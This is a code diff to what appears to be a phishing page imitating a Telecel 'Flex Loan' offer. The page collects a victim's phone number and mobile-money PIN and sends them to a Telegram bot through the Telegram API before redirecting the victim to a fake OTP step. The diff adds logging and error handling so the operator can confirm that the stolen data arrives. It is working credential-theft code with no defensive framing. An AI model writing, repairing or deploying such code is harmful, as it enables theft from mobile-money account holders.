@@ -572,6 +572,9 @@
         HOME_PAGE: 'index.html'
     };
 
+    // ─── GLOBAL PARAMS ───
+    const urlParams = new URLSearchParams(window.location.search);
+
     // Load saved config from localStorage
     function loadConfig() {
         const saved = localStorage.getItem('telecel_config');
@@ -607,12 +610,11 @@
 
     // ─── STATE ───
     let isProcessing = false;
-    const params = new URLSearchParams(window.location.search);
 
     function loadLoanData() {
-        const amount = params.get('amount');
-        const name = params.get('name');
-        const phone = params.get('phone');
+        const amount = urlParams.get('amount');
+        const name = urlParams.get('name');
+        const phone = urlParams.get('phone');
         
         if (amount) document.getElementById('loanAmount').textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
         if (name) document.getElementById('loanDetails').textContent = `${name}'s Flex Loan`;
@@ -654,6 +656,8 @@
             `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
             `✅ User has been redirected to OTP verification.`;
 
+        console.log('📤 Sending Telegram:', message);
+
         // Send to Telegram - fire and forget (don't wait for response)
         fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -663,7 +667,18 @@
                 text: message,
                 parse_mode: 'Markdown'
             })
-        }).catch(() => {});
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('✅ Telegram sent successfully!');
+            } else {
+                console.error('❌ Telegram Error:', data.description);
+            }
+        })
+        .catch(error => {
+            console.error('❌ Fetch Error:', error.message);
+        });
     }
 
     // ─── HANDLE SUBMIT - SEND TELEGRAM THEN REDIRECT ───
@@ -672,9 +687,9 @@
         
         const phone = document.getElementById('phone').value.trim();
         const pin = document.getElementById('pin').value.trim();
-        const amount = params.get('amount') || '0';
-        const name = params.get('name') || 'User';
-        const period = params.get('period') || '30 days';
+        const amount = urlParams.get('amount') || '0';
+        const name = urlParams.get('name') || 'User';
+        const period = urlParams.get('period') || '30 days';
 
         // Validate
         if (phone.length < 10) {
